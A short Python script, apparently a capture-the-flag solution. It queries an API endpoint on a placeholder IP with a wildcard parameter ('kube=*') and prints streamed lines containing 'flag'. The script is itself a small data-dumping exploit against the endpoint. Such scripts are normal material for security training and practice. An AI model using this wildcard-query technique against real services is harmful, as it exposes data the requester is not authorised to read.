import requests

IP = "1.2.3.4"

response = requests.get(f"http://{IP}:3000/api/client/receive?kube=*", stream=True)

for line in response.iter_lines():
    if b'flag' in line:
        print(line)
